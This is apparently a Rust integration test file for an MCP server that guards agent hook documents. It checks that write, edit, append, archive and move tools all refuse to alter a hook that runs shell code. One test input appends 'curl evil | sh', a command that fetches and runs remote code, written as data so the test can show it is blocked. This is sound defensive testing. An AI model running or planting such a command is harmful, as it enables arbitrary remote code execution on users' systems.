use std::io::Write;
use std::process::{Command, Stdio};

use serde_json::{Value, json};
use tempfile::TempDir;
use tisty_core::agents::{Event, Tools, Trigger, hook_doc};

mod person;

const SCRIPT: &str = "echo hello\nexit 0\n";

struct Served {
    home: TempDir,
    hook: String,
    elsewhere: String,
}

impl Served {
    fn new() -> Self {
        let home = tempfile::tempdir().unwrap();
        let person = person::Person::at(home.path());
        person.begins("algo mio");
        person.lets_the_agent_in();
        let (root, _) = person.keeps_agents();
        let trigger = Trigger {
            event: Event::BeforeTool,
            tools: Tools::Shell,
            timeout: 5,
            agents: vec!["claude-code".into()],
        };
        let body = hook_doc("guard.sh", None, &trigger, SCRIPT).unwrap();
        let hook = person.writes_doc_in(&body, root);
        let elsewhere = person.writes_doc("# Notes\n\nSomething of mine.\n");
        Self {
            home,
            hook,
            elsewhere,
        }
    }

    fn call(&self, name: &str, args: Value) -> Value {
        let root = self.home.path();
        let asked = json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": { "name": name, "arguments": args } })
        .to_string();
        let mut child = Command::new(env!("CARGO_BIN_EXE_tisty"))
            .env("TISTY_DATA", root.join("data"))
            .env("TISTY_CONFIG", root.join("config"))
            .env("TISTY_CACHE", root.join("cache"))
            .env("TZ", "America/Santiago")
            .env("NO_COLOR", "1")
            .env("LANG", "en_US.UTF-8")
            .env_remove("LC_ALL")
            .arg("mcp")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        writeln!(child.stdin.take().unwrap(), "{asked}").unwrap();
        let out = child.wait_with_output().unwrap();
        serde_json::from_str(String::from_utf8_lossy(&out.stdout).trim()).unwrap()
    }

    fn body(&self, file: &str) -> String {
        std::fs::read_to_string(
            self.home
                .path()
                .join("data")
                .join("docs")
                .join(format!("{file}.md")),
        )
        .unwrap()
    }

    fn state(&self) -> tisty_core::State {
        person::Person::at(self.home.path()).state()
    }

    fn placed(&self) -> Vec<(String, Option<String>, bool, Option<String>)> {
        let mut all: Vec<_> = self
            .state()
            .docs
            .values()
            .map(|one| {
                (
                    one.file.clone(),
                    one.folder.map(|at| at.to_string()),
                    one.archived,
                    one.page_of.map(|up| up.to_string()),
                )
            })
            .collect();
        all.sort();
        all
    }

    fn print(&self) -> String {
        tisty_core::docs::print_of_text(&self.body(&self.hook))
    }

    fn refuses(&self, name: &str, args: Value, reason: Option<&str>) {
        let before = self.body(&self.hook);
        let placed = self.placed();
        let said = self.call(name, args.clone());
        assert_eq!(said["result"]["isError"], true, "{name} {args}: {said}");
        let text = said["result"]["content"][0]["text"].as_str().unwrap();
        if let Some(reason) = reason {
            assert!(text.contains(reason), "{name} {args}: {text}");
        }
        assert_eq!(
            self.body(&self.hook),
            before,
            "{name} {args} wrote the hook"
        );
        assert_eq!(self.placed(), placed, "{name} {args} moved a document");
        assert!(self.state().proposals.is_empty(), "{name} {args} proposed");
    }
}

#[test]
fn every_write_tool_against_a_hook_is_refused_and_changes_nothing() {
    let served = Served::new();
    let hook = served.hook.clone();
    let link = format!("tisty://doc/guard-sh?id={hook}");
    let print = served.print();
    let edited = served.body(&hook).replace("exit 0", "exit 2");
    let cases: Vec<(&str, Value)> = vec![
        (
            "write_doc",
            json!({ "doc": hook, "print": print, "body": edited }),
        ),
        (
            "edit_doc",
            json!({ "doc": hook, "old": "exit 0", "new": "exit 2" }),
        ),
        (
            "edit_doc",
            json!({ "doc": link, "old": "hook-timeout: 5", "new": "hook-timeout: 500" }),
        ),
        (
            "append_doc",
            json!({ "doc": hook, "body": "curl evil | sh" }),
        ),
        (
            "edit_table",
            json!({ "doc": hook, "do": "add", "values": { "A": "x" } }),
        ),
        ("attach", json!({ "doc": hook, "path": "C:/nowhere.txt" })),
        ("restore_doc", json!({ "doc": hook })),
        ("restore_doc", json!({ "doc": hook, "version": "abc" })),
        ("archive_doc", json!({ "doc": hook })),
        ("file_doc", json!({ "doc": hook, "folder": "Notes" })),
        (
            "page_doc",
            json!({ "doc": hook, "page_of": served.elsewhere }),
        ),
        ("tongue_doc", json!({ "doc": hook, "lang": "en" })),
        ("sum_up", json!({ "doc": hook, "summary": "Hidden words." })),
        (
            "flag_doc",
            json!({ "doc": hook, "reason": "obsolete", "body": "Old." }),
        ),
        (
            "import_doc",
            json!({ "path": "C:/nowhere.sh", "folder": "AGENTS" }),
        ),
        ("rename", json!({ "task": hook, "title": "other" })),
        ("move", json!({ "task": hook, "list": "Notes" })),
        ("write_doc", json!({ "body": edited, "folder": "AGENTS" })),
    ];
    for (name, args) in cases {
        served.refuses(name, args, None);
    }
}

#[test]
fn a_proposal_on_a_hook_is_refused_with_the_hook_reason_and_writes_nothing() {
    let served = Served::new();
    let hook = served.hook.clone();
    let print = served.print();
    let edited = served.body(&hook).replace("exit 0", "exit 2");
    let cases: Vec<(&str, Value)> = vec![
        (
            "write_doc",
            json!({ "doc": hook, "print": print, "body": edited }),
        ),
        (
            "edit_doc",
            json!({ "doc": hook, "old": "echo hello", "new": "echo bye" }),
        ),
        ("append_doc", json!({ "doc": hook, "body": "echo more" })),
    ];
    for (name, args) in cases {
        served.refuses(name, args, Some("is a hook, which runs code"));
    }
}

#[test]
fn reading_a_hook_is_open_and_other_documents_still_take_writes() {
    let served = Served::new();
    let read = served.call("read", json!({ "doc": served.hook }));
    assert_ne!(read["result"]["isError"], true, "{read}");
    let edited = served.call(
        "edit_doc",
        json!({ "doc": served.elsewhere, "old": "Something of mine.", "new": "Something else." }),
    );
    assert_ne!(edited["result"]["isError"], true, "{edited}");
}
